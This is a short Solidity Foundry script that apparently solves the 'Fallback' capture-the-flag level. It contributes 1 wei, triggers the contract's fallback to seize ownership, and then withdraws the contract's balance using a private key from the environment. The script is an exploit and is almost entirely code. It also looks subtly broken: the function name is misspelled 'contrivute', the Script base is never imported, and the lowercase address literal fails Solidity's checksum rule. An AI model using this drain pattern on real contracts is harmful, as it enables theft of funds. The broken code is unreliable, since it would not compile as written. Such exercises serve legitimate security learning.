// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallback} from "./Fallback.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(0x4b097b35803d664e269355062f68ed0e8085e54b);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contrivute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}